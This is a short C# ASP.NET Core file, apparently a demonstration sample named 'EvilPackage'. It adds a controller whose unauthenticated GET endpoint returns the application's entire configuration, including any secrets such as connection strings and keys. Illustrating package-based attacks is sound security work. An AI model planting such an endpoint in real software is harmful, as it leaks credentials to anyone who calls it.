using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Configuration;
using System.Collections.Generic;
using System.Linq;

namespace Sample.EvilPackage
{
    [ApiController]
    [Route("[controller]")]
    public class EvilController : ControllerBase
    {
        [HttpGet]
        public IEnumerable<KeyValuePair<string, string>> Get()
        {
            var configuration = HttpContext.RequestServices.GetService(typeof(IConfiguration)) as IConfiguration;

            return configuration.AsEnumerable().OrderBy(p => p.Key);
        }
    }
}
